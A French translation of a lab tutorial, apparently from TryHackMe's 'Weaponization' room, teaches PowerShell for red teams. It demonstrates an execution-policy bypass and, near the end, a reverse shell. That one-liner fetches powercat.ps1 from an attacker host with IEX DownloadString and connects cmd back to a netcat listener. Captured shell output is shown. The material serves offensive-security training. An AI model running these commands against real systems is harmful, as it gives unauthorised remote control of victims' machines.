PowerShell (PSH)
==========================

PowerShell est un langage de programmation orienté objet exécuté à partir du Dynamic Language Runtime (DLR) dans  .NET avec quelques exceptions pour les utilisations héritées. Consultez la salle TryHackMe,[Hacking with PowerShell pour plus d'informations sur PowerShell](https://tryhackme.com/room/powershell).

Les équipes rouges s'appuient sur PowerShell pour effectuer diverses activités, notamment l'accès initial, les énumérations système et bien d'autres. Commençons par créer un script PowerShell simple qui imprime « Bienvenue dans la salle de militarisation ! » comme suit,

```
Write-Output "Welcome to the Weaponization Room!"
```

Enregistrez le fichier sous  thm.ps1 . Avec  Write-Output , nous imprimons le message "Welcome to the Weaponization Room!" à l'invite de commande. Maintenant, exécutons-le et voyons le résultat.

CMD

```
C:\Users\thm\Desktop>powershell -File thm.ps1
File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess

C:\Users\thm\Desktop>

```

Politique d'exécution

La politique d'exécution de PowerShell est une  option de sécurité pour protéger le système contre l'exécution de scripts malveillants. Par défaut, Microsoft désactive l'exécution des scripts PowerShell .ps1 pour des raisons de sécurité. La stratégie d'exécution de PowerShell est définie sur Restricted , ce qui signifie qu'elle autorise les commandes individuelles mais n'exécute aucun script.

Vous pouvez déterminer le paramètre PowerShell actuel de votre Windows comme suit,

CMD

```
PS C:\Users\thm> Get-ExecutionPolicy
Restricted
```

Nous pouvons également modifier facilement la politique d'exécution de PowerShell en exécutant :

CMD

```
PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A
```

Contourner la politique d'exécution

Microsoft fournit des moyens de désactiver cette restriction. L'une de ces façons consiste à donner une option d'argument à la commande PowerShell pour la modifier selon le paramètre souhaité. Par exemple, nous pouvons le changer pour contourner la politique, ce qui signifie que rien n'est bloqué ou restreint. Ceci est utile car cela nous permet d'exécuter nos propres scripts PowerShell .

Afin de nous assurer que notre fichier PowerShell est exécuté, nous devons fournir l'option de contournement dans les arguments comme suit,

CMD

```
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
Welcome to Weaponization Room!
```

Maintenant, essayons d'obtenir un reverse shell en utilisant l'un des outils écrits en PowerShell , qui est powercat . Sur votre AttackBox, téléchargez-le depuis GitHub et exécutez un serveur Web pour fournir la charge utile.

Terminal

```
user@machine$ git clone https://github.com/besimorhino/powercat.git
Cloning into 'powercat'...
remote: Enumerating objects: 239, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
Resolving deltas: 100% (72/72), done.
```

Maintenant, nous devons configurer un serveur Web sur cette AttackBox pour servir le powercat.ps1 qui sera téléchargé et exécuté sur la machine cible. Ensuite, changez le répertoire en powercat et commencez à écouter sur un port de votre choix. Dans notre cas, nous utiliserons le port  8080 .

Terminal

```
user@machine$ cd powercat
user@machine$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Sur l'AttackBox, nous devons écouter sur le port 1337 en utilisant nc pour recevoir la connexion de la victime.

Terminal

```
user@machine$ nc -lvp 1337
```

Maintenant, à partir de la machine victime, nous téléchargeons la charge utile et l'exécutons à l'aide de la charge utile PowerShell comme suit,

Terminal

```
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```

Maintenant que nous avons exécuté la commande ci-dessus, la machine victime télécharge la  charge utile powercat.ps1  depuis notre serveur Web (sur l'AttackBox), puis l'exécute localement sur la cible à l'aide de cmd.exe et renvoie une connexion à l'AttackBox qui écoute sur le port 1337 . Après quelques secondes, nous devrions recevoir le rappel de connexion :   

Terminal

```
user@machine$ nc -lvp 1337  listening on [any] 1337 ...
10.10.12.53: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\thm>
```
